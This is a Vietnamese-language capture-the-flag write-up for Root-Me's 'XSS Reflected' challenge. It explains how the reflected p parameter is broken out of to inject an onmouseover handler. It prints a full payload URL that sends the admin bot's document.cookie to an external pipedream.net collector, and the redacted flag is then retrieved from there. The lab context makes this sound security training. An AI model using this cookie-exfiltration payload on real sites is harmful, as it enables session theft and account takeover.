# WRITE UP

## **Challenge: [XSS Reflected](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)**

Kiểm tra source website ta thấy web bị comment 1 thẻ &lt;a&gt; dẫn đến ?p=security:

<img src="./media/image1.png" style="width:6.5in;height:2.89861in" alt="Text Description automatically generated" />

Request đến ?p=security, website hiển thị trang web lỗi và có một hyperlink thẻ &lt;a&gt; hiển thị nội dung ‘security’:

<img src="./media/image2.png" style="width:6.5in;height:3.03403in" alt="Graphical user interface, text, application Description automatically generated" />

Thử nhập ?p=&lt;giá trị khác&gt;, page sẽ báo lỗi và hiển thị nội dung &lt;giá trị khác&gt; trong thẻ &lt;a&gt;. Như vậy, lợi dụng thẻ &lt;a&gt; này, ta thực hiện đóng quote cũng như chèn thêm event để thực hiện XSS:

<img src="./media/image3.png" style="width:6.5in;height:2.2625in" alt="Graphical user interface, text, application Description automatically generated" />

Đến đây, sau khi thử get trực tiếp document.cookie nhưng không có giá trị, ta thực hiện gửi HTTP Request và qua RequestBin chờ cookie.

Payload: <http://challenge01.root-me.org/web-client/ch26/?p=nh4ttruong%27%20onmouseover=%27document.location=%22https://eol9dtzbk9673pb.m.pipedream.net?%22.concat(document.cookie)>

Thực hiện request với payload, sau đó ta trigger event ‘onmouseover’ và di chuyển chuột qua thẻ &lt;a&gt; để chuyển hướng website:

<img src="./media/image4.png" style="width:6.5in;height:1.03958in" alt="Graphical user interface, application Description automatically generated" />

Sau đó, ta thực hiện lại một lần nữa nhưng sẽ thực hiện thêm bước Report đến admin đển POST request:

<img src="./media/image5.png" style="width:5.21935in;height:2.0922in" alt="Graphical user interface, text, application, email Description automatically generated" />

<img src="./media/image6.png" style="width:6.5in;height:1.86042in" alt="Graphical user interface, text Description automatically generated" />

Qua RequestBin và nhận flag:

<img src="./media/image7.png" style="width:6.5in;height:1.94931in" alt="Graphical user interface, text, application Description automatically generated" />

\- Flag: \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
